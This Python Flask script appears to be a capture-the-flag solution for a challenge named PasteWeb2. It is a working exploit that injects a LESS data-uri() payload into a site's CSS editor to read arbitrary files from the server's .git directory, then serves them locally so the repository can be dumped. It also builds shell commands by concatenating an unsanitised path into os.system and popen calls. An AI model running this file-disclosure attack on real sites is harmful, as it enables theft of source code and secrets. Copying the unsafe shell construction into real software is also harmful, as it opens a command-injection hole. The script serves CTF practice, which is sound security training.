# PasteWeb2/server/server.py
from base64 import b64decode
from flask import Flask, send_file
import io
from os import system, popen

app = Flask(__name__)

@app.route('/')
def index():
	return 'Hello'

def leak_file_content(path):
    sessionID = '64sateuc0q1ilgun943qihuhtr' # need to change every time
    system('curl https://pasteweb.ctf.zoolab.org/editcss.php ' + \
    '--cookie \'PHPSESSID=' + sessionID + '\' --request POST -d ' + \
    '\'less=.a {content: data-uri("/var/www/html/.git/' + path + '");}\'')
    response = popen('curl https://pasteweb.ctf.zoolab.org/view.php ' + \
    '--cookie \'PHPSESSID=' + sessionID + '\'').read()
    index1 = response.find(';base64,')
    index2 = response.find('");\n}')
    base64_code = response[index1+8:index2]
    return b64decode(base64_code)

@app.route('/.git/<path:pathname>')
def git(pathname):
	return send_file(
        io.BytesIO(leak_file_content(pathname)),
        download_name=pathname.split('/')[-1],
        as_attachment=True
    )

if __name__ == '__main__':
	app.run(debug=True)